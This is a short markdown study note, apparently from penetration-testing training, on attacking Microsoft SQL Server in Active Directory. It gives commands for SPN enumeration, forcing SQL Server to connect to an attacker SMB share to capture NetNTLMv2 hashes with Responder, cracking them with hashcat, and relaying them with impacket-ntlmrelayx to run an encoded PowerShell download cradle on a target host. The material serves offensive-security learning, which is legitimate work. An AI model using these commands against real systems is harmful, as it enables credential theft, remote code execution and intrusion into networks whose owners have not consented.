## Microsoft SQL attacks

MSSQL in AD have SPN. To query the DC:

#AD #SPN #cmd
``` cmd
setspn -T corp1 -Q MSSQLSvc/*
```

#useful-script #ps1
``` ps1
. .\GetUserSPNs.ps1
```

### Authentication in MSSQL

In AD this is handled by Kerberos, and the mapping between the user and dbo is done. If no mapping, the user will be guest. To login mapped to sa will have sysadmin role. 

Domain Users are member of Builtin Users group which has access by default.

For code refer to the mssql-exp VS project.

### UNC Path Injection 

The idea is to force the MSSQL to connect to our SMB share so we capture NETNTLMv2 hash for cracking, later we will also learn to relay the hash.
We must provide the UNC path with IP, not hostname as Windows would automatically switch from Kerberos to NetNTLM. 

Run the mssql-exp binary, but start the responder first on Kali to get the hash.
#NetNTLM #responder
``` bash
sudo responder -I tun0
```

For cracking
#hashcat #cracking
``` bash
sudo hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


### Relay NetNTLM hash

To not crack the hash we can relay it - the password may be strong. If the user whose hash we relay is local admin, we can get code exec. It is only possible if SMB signing not enabled (enabled by default on DC, but not on the standard Windows Servers).

To start the relay attack we give the encoded ps1 with download cradle:
#encoding #impacket
``` bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc <encoded_download_cradle>'
```






